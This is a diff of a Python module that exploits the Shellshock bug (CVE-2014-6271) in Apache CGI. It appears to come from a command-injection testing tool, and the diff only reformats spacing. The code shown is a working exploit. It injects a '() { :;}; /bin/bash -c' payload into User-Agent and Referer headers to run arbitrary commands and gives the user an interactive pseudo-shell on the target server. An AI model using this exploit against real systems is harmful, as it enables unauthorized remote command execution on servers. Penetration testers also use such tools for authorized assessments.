@@ -17,12 +17,13 @@ This module exploits the vulnerability CVE-2014-6271 [1] in Apache CGI.
 """
 
 # Available HTTP headers
-headers = ["User-Agent","Referer"]
+headers = ["User-Agent", "Referer"]
 
 # Shellshock Payloads
 classic_payload = "() { :;}; echo 'Shellshocked:Done';"
 
-def classic_check(url,http_request_method):
+
+def classic_check(url, http_request_method):
     injection_type = "results-based command injection"
     technique = "classic shellshock injection technique"
     shellshoked = False
@@ -49,9 +50,9 @@ def classic_check(url,http_request_method):
 
             if menu.options.os_cmd:
                cmd = menu.options.os_cmd 
-               classic_cmd_exec(url,cmd)
+               classic_cmd_exec(url, cmd)
             else:
-                classic_input_cmd(url,http_request_method)
+                classic_input_cmd(url, http_request_method)
         else:
             print ""
             sys.exit(0)
@@ -62,7 +63,8 @@ def classic_check(url,http_request_method):
     except urllib2.URLError, err:
         print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
 
-def classic_input_cmd(url,http_request_method):
+
+def classic_input_cmd(url, http_request_method):
     while True:
       gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
       if gotshell in settings.CHOISE_YES:
@@ -73,7 +75,7 @@ def classic_input_cmd(url,http_request_method):
               if cmd == "q":
                 os._exit(0)
               else: 
-                classic_cmd_exec(url,cmd)
+                classic_cmd_exec(url, cmd)
 
             except KeyboardInterrupt:
               print ""
@@ -83,7 +85,8 @@ def classic_input_cmd(url,http_request_method):
               print ""
               os._exit(0)
 
-def classic_cmd_exec(url,cmd):
+
+def classic_cmd_exec(url, cmd):
     for check_header in headers:
         try:
             header = { check_header : '() { :;}; /bin/bash -c "' + cmd + '"'}
@@ -112,8 +115,9 @@ def classic_cmd_exec(url,cmd):
         except urllib2.URLError, err:
             print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
 
-def shellshock_handler(url,http_request_method):       
-    classic_check(url,http_request_method)
+
+def shellshock_handler(url, http_request_method):       
+    classic_check(url, http_request_method)
 
 if __name__ == "__main__":
-  shellshock_handler(url,http_request_method)
+  shellshock_handler(url, http_request_method)
